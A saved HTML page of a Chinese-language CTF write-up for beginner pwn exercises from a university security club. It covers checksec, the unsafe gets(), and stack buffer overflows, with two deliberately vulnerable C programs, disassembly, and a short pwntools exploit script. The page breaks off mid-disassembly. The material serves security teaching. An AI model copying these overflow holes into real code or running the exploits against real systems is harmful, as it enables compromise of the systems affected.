@@ -1,0 +1,509 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>[NSYSU 資安社課] Pwn Basic #1 - Cyris&#39;s Blog</title><meta name="Description" content="This is Cyris&#39;s blog, recording life and sharing security learning."><meta property="og:title" content="[NSYSU 資安社課] Pwn Basic #1" />
+<meta property="og:description" content="經歷大約一學期的 CTF 洗禮，總算是對這分面稍微有些概念 : D
+原本已經這個部落格的定位應該要是技術向，殊不知都被我拿來發廢文&hellip;" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://blog.cyris.tw/posts/2020/nsysuisc-pwn-01/" /><meta property="og:image" content="https://blog.cyris.tw/img/cyris.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2020-03-22T00:00:00+00:00" />
+<meta property="article:modified_time" content="2020-03-22T00:00:00+00:00" /><meta property="og:site_name" content="Cyris&#39;s Blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://blog.cyris.tw/img/cyris.png"/>
+
+<meta name="twitter:title" content="[NSYSU 資安社課] Pwn Basic #1"/>
+<meta name="twitter:description" content="經歷大約一學期的 CTF 洗禮，總算是對這分面稍微有些概念 : D
+原本已經這個部落格的定位應該要是技術向，殊不知都被我拿來發廢文&hellip;"/>
+<meta name="twitter:site" content="@yctseng1227"/>
+<meta name="application-name" content="Cyris&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Cyris&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/img/favicon.ico"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://blog.cyris.tw/posts/2020/nsysuisc-pwn-01/" /><link rel="prev" href="https://blog.cyris.tw/posts/2019/codeforces-april-fools-day-2019/" /><link rel="next" href="https://blog.cyris.tw/posts/2020/tjctf-2020-weakpassword/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "[NSYSU 資安社課] Pwn Basic #1",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/blog.cyris.tw\/posts\/2020\/nsysuisc-pwn-01\/"
+        },"image": ["https:\/\/blog.cyris.tw\/img\/cyris.png"],"genre": "posts","keywords": "NSYSUISC 中山資安社, Pwn Challenge","wordcount":  687 ,
+        "url": "https:\/\/blog.cyris.tw\/posts\/2020\/nsysuisc-pwn-01\/","datePublished": "2020-03-22T00:00:00+00:00","dateModified": "2020-03-22T00:00:00+00:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "Cyris","logo": "https:\/\/blog.cyris.tw\/img\/cyris.png"},"author": {
+                "@type": "Person",
+                "name": "Cyris Tseng"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="auto" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Cyris&#39;s Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/img/favicon.ico"
+        data-srcset="/img/favicon.ico, /img/favicon.ico 1.5x, /img/favicon.ico 2x"
+        data-sizes="auto"
+        alt="/img/favicon.ico"
+        title="/img/favicon.ico" />Cyris&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Cyris&#39;s Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/img/favicon.ico"
+        data-srcset="/img/favicon.ico, /img/favicon.ico 1.5x, /img/favicon.ico 2x"
+        data-sizes="auto"
+        alt="/img/favicon.ico"
+        title="/img/favicon.ico" />Cyris&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">[NSYSU 資安社課] Pwn Basic #1</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://blog.cyris.tw" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Cyris Tseng</a></span>&nbsp;<span class="post-category">included in <a href="/categories/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8-cyber-security/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>資訊安全 Cyber Security</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2020-03-22">2020-03-22</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;687 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;4 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x01-password">0x01: Password</a></li>
+    <li><a href="#0x02-bof">0x02: BOF</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>經歷大約一學期的 CTF 洗禮，總算是對這分面稍微有些概念 : D<br>
+原本已經這個部落格的定位應該要是技術向，殊不知都被我拿來發廢文&hellip;</p>
+<br>
+<p>作為第一篇 writeup，決定拿社課的習題練練手，一方面是讓我自己在這方面的學習上可以邊寫邊延伸思考。另外就是可以給非資安背景的朋友簡單認識一下 Pwn ，否則每次被問到我也不曉得怎麼解釋（抹臉）</p>
+<p>hmmm 不會解釋資安&hellip; 應該是我的問題才對Orz</p>
+<p><br><br></p>
+<p>&ldquo;<strong>Pwn</strong>&rdquo; 有人唸 Costco、有人唸 IKEA，總之我都唸&quot;<strong>胖</strong>&ldquo;或是&rdquo;<strong>碰</strong>&quot;。常見做法就是針對程式內的漏洞進行攻擊（提權），有種 &ldquo;<strong>player has been owned.</strong>&rdquo; 的意思。<br>
+也有人說是Penetration(滲透) + Own(佔有)的組合，總之就大概是這種感覺～ 在CTF領域，Pwn 基礎題通常是給你讀取的無權限文字檔，希望你透過程式漏洞拿到 root 權限拿 flag。</p>
+<p>以我來說，平常剛拿到題目比較會用到的幾個指令。</p>
+<ul>
+<li><code>ls -al</code> 瞭解目錄下的檔案以及執行權限</li>
+<li><code>file</code> 確認檔案類型以及位元數</li>
+<li><code>checksec</code> 查看該ELF檔開啟了哪些保護機制</li>
+</ul>
+<br>
+那接下來就開始解題囉！ovo
+<br>
+<h2 id="0x01-password">0x01: Password</h2>
+<p>首先，來看一下這題提供的檔案。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">password
+</span></span><span class="line"><span class="cl">password.c
+</span></span><span class="line"><span class="cl">flag.txt
+</span></span></code></pre></div><p>第一個檔案 <code>password</code> 用 <code>file</code> 指令可以查看關於password的檔案類型。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ file ./password
+</span></span><span class="line"><span class="cl">password: ELF 32-bit LSB executable, Intel 80386, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib/ld-, <span class="k">for</span> GNU/Linux 2.6.32, BuildID<span class="o">[</span>sha1<span class="o">]=</span>78715d2680bfeafa1b0a97978bfe8816be4d8423, not stripped
+</span></span></code></pre></td></tr></table>
+</div>
+</div><br>
+<p>可以發現是屬於 Linux 底下的 ELF 執行檔，也是 CTF 內最常見的檔案類型，不過用 MacOS 的 Safari 載下來都會莫名被加上<code>.dms</code>，當時第一次看到還在思考檔案是不是壞了XD（用 <code>file</code> 查看是沒有問題），另外社課提供的 Pwn 基礎題以 <code>32-bits</code> 為主，比起 64-bits 相對單純方便教學。</p>
+<p>再來就是直接執行看看&hellip; 咦？不能執行？</p>
+<p>用 <code>ls</code> 發現這個檔案並沒有執行權限，可以用 <code>chmod</code> 改檔案權限。對其他細節有興趣的可以瞭解一下 <a href="https://linux.vbird.org/linux_basic/centos7/0210filepermission.php" target="_blank" rel="noopener noreffer ">鳥哥私房菜 - Linux的檔案權限與目錄配置</a>。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ls -al
+</span></span><span class="line"><span class="cl">-rw-r-xr-x@ <span class="o">[</span>other information<span class="o">]</span> password
+</span></span><span class="line"><span class="cl">$ chmod +x ./password
+</span></span><span class="line"><span class="cl">$ ls -al
+</span></span><span class="line"><span class="cl">-rwxr-xr-x@ <span class="o">[</span>other information<span class="o">]</span> password
+</span></span></code></pre></div><br>
+<p>修改完執行權限後可以先run一下看看程式大概要幹嘛。
+在Pwn基礎題通常會刻意把一些<strong>防禦機制</strong>關掉，可以拿 <code>checksec</code> 指令看看該執行檔開了哪些保護，以password這題來說。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ checksec ./password
+</span></span></code></pre></div><pre>
+Arch:     i386-32-little
+RELRO:    <font color='EAC100'>Partial RELRO</font>
+Stack:    <font color='FF0000'>No canary found</font>
+NX:       <font color='009100'>NX enabled</font>
+PIE:      <font color='FF0000'>No PIE (0x8048000)</font>
+</pre>
+<p>第一次見到這些保護機制看不懂很正常，簡單講就是</p>
+<ol>
+<li><code>RELRO</code> 暫時還不會用到，主要適用於<strong>防範 lazy Binding</strong> 所造成的延伸問題</li>
+<li>Stack 的 <code>canary</code> 關閉能夠讓你的輸入超過指定長度蓋到一些奇怪的位址，簡單講就是能 Buffer Overflow</li>
+<li><code>NX</code> 開啟表示不讓你塞些邪惡的command在程式內執行，之後也會有這部分的練習</li>
+<li><code>PIE</code> 關閉讓你分析執行檔時看到的會是&quot;絕對位址&quot;，若開啟就只看得到位址偏移量不容易拿來利用</li>
+</ol>
+<blockquote>
+<p>P.S. 另外還有一個沒出現在 <code>checksec</code> 的 <code>ASLR</code> ，主要是對於每次執行 stack 、heap &hellip; etc. 的位址隨機化，避免攻擊者可以定位記憶體位址</p>
+</blockquote>
+<p>之後根據社課這部分內容應該會再講詳細點，剛開始大概有個認知就行了。
+然後，社課的基礎題還順便附了該執行程式的原始碼，<del>╭(⊙Д⊙)╯佛心講師╭(⊙Д⊙)╯</del></p>
+<div class="highlight" filename="password.c"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="p">...</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">password</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;12345678&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;What&#39;s your name? &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">gets</span><span class="p">(</span><span class="n">name</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Hello %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">strcmp</span><span class="p">(</span><span class="n">password</span><span class="p">,</span> <span class="s">&#34;password&#34;</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Welcome :) &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">shell</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;QQ %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">password</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>這段 code 對於有寫過程式的各位應該都不困難。<br>
+題意要求輸入 <code>name</code> ，然後會拿變數 <code>password</code> 和 &ldquo;<strong>password</strong>&rdquo; 進行比較，判斷式成立就能執行 <code>shell()</code>，可以發現當中並沒有任何要求輸入變數<code>password</code>，只有在最後會輸出 &ldquo;QQ <code>password</code>&quot;，若第一次接觸 Pwn 的看到這奇怪的判斷式應該會滿頭問號。</p>
+<p>不過，我們可以先隨便輸入一些東西觀察看看，像是變數 <code>name</code> 大小為 8 bytes，輸入 &ldquo;12345678&rdquo;，會得到下面結果。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ What<span class="err">&#39;</span>s your name? <span class="m">12345678</span>
+</span></span><span class="line"><span class="cl">$ Hello <span class="m">12345678</span>
+</span></span><span class="line"><span class="cl">QQ 
+</span></span><span class="line"><span class="cl">Segmentation fault
+</span></span></code></pre></div><p>然而，如果輸入超過 8 bytes &ldquo;1234567890&rdquo;，會得到下列結果。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ What<span class="err">&#39;</span>s your name? <span class="m">1234567890</span>
+</span></span><span class="line"><span class="cl">$ Hello <span class="m">1234567890</span>
+</span></span><span class="line"><span class="cl">QQ <span class="m">90</span>
+</span></span><span class="line"><span class="cl">Segmentation fault
+</span></span></code></pre></div><p>嗯嗯？明明沒有對變數 <code>password</code> 輸入參數，但變數內容好像被偷改了XD</p>
+<br>
+<p>沒錯！這題主要想表達的事情是：</p>
+<div class="details admonition info open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw" aria-hidden="true"></i>Note<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><code>gets()</code> 這輸入函式是不安全的，因為它不會限制使用者的輸入長度。<br>
+因此若在<strong>沒有 canary 的情況下</strong>很容易遭受 <strong>Buffer Overflow</strong> 攻擊！</div>
+        </div>
+    </div>
+<p>以這題來說我們可以用反組譯指令 <code>objdump</code> 瞭解一下程式架構</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ objdump -d -M intel ./password
+</span></span></code></pre></div><p>Stack內容的部分畫成圖大概長得像這樣</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://res.cloudinary.com/eevee-blog/image/upload/c_scale,f_auto,q_auto,w_600/v1618818959/blog-posts/2020-03/20-stack-frame-1.webp"
+        data-srcset="https://res.cloudinary.com/eevee-blog/image/upload/c_scale%2cf_auto%2cq_auto%2cw_600/v1618818959/blog-posts/2020-03/20-stack-frame-1.webp, https://res.cloudinary.com/eevee-blog/image/upload/c_scale%2cf_auto%2cq_auto%2cw_600/v1618818959/blog-posts/2020-03/20-stack-frame-1.webp 1.5x, https://res.cloudinary.com/eevee-blog/image/upload/c_scale%2cf_auto%2cq_auto%2cw_600/v1618818959/blog-posts/2020-03/20-stack-frame-1.webp 2x"
+        data-sizes="auto"
+        alt="https://res.cloudinary.com/eevee-blog/image/upload/c_scale,f_auto,q_auto,w_600/v1618818959/blog-posts/2020-03/20-stack-frame-1.webp"
+        title=" " /></p>
+<p>我們這次輸入改成 &ldquo;aaaaaaaahaha&rdquo; ， &ldquo;haha&rdquo; 就會蓋到變數 <code>password</code> 的值了。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://res.cloudinary.com/eevee-blog/image/upload/c_scale,f_auto,q_auto,w_600/v1618818959/blog-posts/2020-03/20-stack-frame-2.webp"
+        data-srcset="https://res.cloudinary.com/eevee-blog/image/upload/c_scale%2cf_auto%2cq_auto%2cw_600/v1618818959/blog-posts/2020-03/20-stack-frame-2.webp, https://res.cloudinary.com/eevee-blog/image/upload/c_scale%2cf_auto%2cq_auto%2cw_600/v1618818959/blog-posts/2020-03/20-stack-frame-2.webp 1.5x, https://res.cloudinary.com/eevee-blog/image/upload/c_scale%2cf_auto%2cq_auto%2cw_600/v1618818959/blog-posts/2020-03/20-stack-frame-2.webp 2x"
+        data-sizes="auto"
+        alt="https://res.cloudinary.com/eevee-blog/image/upload/c_scale,f_auto,q_auto,w_600/v1618818959/blog-posts/2020-03/20-stack-frame-2.webp"
+        title=" " /></p>
+<p>聰明的你應該知道怎麼做了吧 (｡･ω･｡)<br>
+沒有錯的啦！將上面的 &ldquo;haha&rdquo; 改成 &ldquo;password&rdquo; 就能啟動 <code>shell()</code> 拿到 root 權限了！</p>
+<p>話說回來，往後能夠透過手動輸入就破解的 Pwn 題並不常見，因此這類型的題目通常會搭配 Python 套件 <code>pwntool</code> 進行 exploit。</p>
+<p>↓↓↓ 以這題來說用pwntool可以這樣寫 ↓↓↓</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># process:本機連線, remote:遠端連線</span>
+</span></span><span class="line"><span class="cl"><span class="n">conn</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./password&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 根據程式內容設計輸入(payload)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;12345678password&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 傳送給程式後, 由於會執行shell需要用interactive()進行互動</span>
+</span></span><span class="line"><span class="cl"><span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="n">conn</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><br>
+<p>光是第一題就寫了落落長&hellip;<br>
+打 Pwn 一開始抓不到感覺還蠻正常，所以我希望能用step by step的方式解釋詳細一點，順便幫自己補充平常不太會深入的知識。</p>
+<p><br><br></p>
+<h2 id="0x02-bof">0x02: BOF</h2>
+<p>這題給的檔案有</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">bof
+</span></span><span class="line"><span class="cl">bof.c
+</span></span><span class="line"><span class="cl">flag.txt
+</span></span></code></pre></div><p>同樣 flag 沒有讀取權限，我們一樣來看看 <code>bof</code> 執行檔有開了哪些保護。</p>
+<pre>
+Arch:     i386-32-little
+RELRO:    <font color='EAC100'>Partial RELRO</font>
+Stack:    <font color='FF0000'>No canary found</font>
+NX:       <font color='009100'>NX enabled</font>
+PIE:      <font color='FF0000'>No PIE (0x8048000)</font>
+</pre>
+<p>唔嗯&hellip; 可以發現和上一題形式上十分類似，再來看看<code>bof.c</code>原始碼的內容</p>
+<div class="highlight" filename="bof.c"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">shell</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">vuln</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">str</span><span class="p">[</span><span class="mi">48</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Input: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">gets</span><span class="p">(</span><span class="n">str</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="p">...</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">vuln</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>整體結構看起來和上一題沒什麼差別，也都是針對 <code>gets()</code> 的危險漏洞，只是這次&hellip; 完全沒辦法執行 <code>shell()</code> !!!</p>
+<p>這題主要想表達的事情是：</p>
+<div class="details admonition info open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw" aria-hidden="true"></i>Note<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">利用 <code>gets()</code> 不限輸入長度的漏洞進行 Buffer Overflow。<br>
+而且要把 <code>vuln()</code> 原本要回到 <code>main()</code> 的 return address 改成 <code>shell()</code> 的 address。</div>
+        </div>
+    </div>
+<p>嗯&hellip; 蛤!? ・ ࡇ ・<br>
+我相信有學過 OS 的同學大概都不陌生，只是懂歸懂，但要怎麼做呢？</p>
+<br>
+<p>一樣先拿 <code>objdump</code> 一樣來看看裡頭長什麼樣子。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ objdump -d -M intel ./bof
+</span></span></code></pre></div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">080484eb &lt;shell&gt;:
+</span></span><span class="line"><span class="cl"> 80484eb:	<span class="m">55</span>                   	push   ebp
+</span></span><span class="line"><span class="cl"> 80484ec:	<span class="m">89</span> e5                	mov    ebp,esp
+</span></span><span class="line"><span class="cl"> 80484ee:	<span class="m">68</span> e0 <span class="m">85</span> <span class="m">04</span> <span class="m">08</span>       	push   0x80485e0
+</span></span><span class="line"><span class="cl"> 80484f3:	e8 b8 fe ff ff       	call   80483b0 &lt;system@plt&gt;
+</span></span><span class="line"><span class="cl"> 80484f8:	<span class="m">83</span> c4 <span class="m">04</span>             	add    esp,0x4
+</span></span><span class="line"><span class="cl"> 80484fb:	<span class="m">90</span>                   	nop
+</span></span><span class="line"><span class="cl"> 80484fc:	c9                   	leave
+</span></span><span class="line"><span class="cl"> 80484fd:	c3                   	ret
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">080484fe &lt;vuln&gt;:
+</span></span><span class="line"><span class="cl"> 80484fe:	<span class="m">55</span>                   	push   ebp
+</span></span><span class="line"><span class="cl"> 80484ff:	<span class="m">89</span> e5                	mov    ebp,esp
+</span></span><span class="line"><span class="cl"> 8048501:	<span class="m">83</span> ec <span class="m">30</span>             	sub    esp,0x30
+</span></span><span class="line"><span class="cl"> 8048504:	<span class="m">68</span> e8 <span class="m">85</span> <span class="m">04</span> <span class="m">08</span>       	push   0x80485e8
+</span></span><span class="line"><span class="cl"> 8048509:	e8 <span class="m">82</span> fe ff ff       	call   <span class="m">8048390</span> &lt;printf@plt&gt;
+</span></span><span class="line"><span class="cl"> 804850e:	<span class="m">83</span> c4 <span class="m">04</span>             	add    esp,0x4
+</span></span><span class="line"><span class="cl"> 8048511:	8d <span class="m">45</span> d0             	lea    eax,<span class="o">[</span>ebp-0x30<span class="o">]</span>
+</span></span><span class="line"><span class="cl"> 8048514:	<span class="m">50</span>                   	push   eax
+</span></span><span class="line"><span class="cl"> 8048515:	e8 <span class="m">86</span> fe ff ff       	call   80483a0 &lt;gets@plt&gt;
+</span></span><span class="line"><span class="cl"> 804851a:	<span class="m">83</span> c4 <span class="m">04</span>             	add    esp,0x4
